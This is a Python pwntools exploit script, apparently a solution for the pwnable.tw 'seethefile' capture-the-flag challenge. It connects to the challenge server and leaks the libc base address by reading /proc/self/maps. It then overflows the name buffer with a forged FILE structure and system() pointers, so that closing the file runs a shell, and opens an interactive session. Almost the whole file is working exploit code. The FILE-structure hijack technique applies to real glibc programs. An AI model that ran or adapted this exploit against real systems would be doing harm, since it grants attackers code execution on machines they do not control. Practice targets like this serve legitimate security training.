# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './seethefile'
e = ELF(file)
libc = e.libc
rlibc = './libc_32.so.6'
ip = 'chall.pwnable.tw'
port = '10200'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)

# open
sla(':', '1')
sla(':', '/proc/self/maps')
sla(':', '2')
sla(':', '2')
sla(':', '3')
ru('0 \n')
libc.address = int('0x' + rn(8),16)
print hex(libc.address)
fake_file = '\xff\xff\xdf\xff;$0\x00'
fake_file = fake_file.ljust(0x94, '\x00')
fake_file += p32(0x804b324)
payload = 'mask'.ljust(0x10, '\x00')
payload += p32(libc.symbols['system']) * 4
payload += p32(0x0804B284)
payload += fake_file
payload += p32(libc.symbols['system']) * 20
# dbg('b*0x8048B0F')
sla(':', '5')
sla('name :',payload)

shell()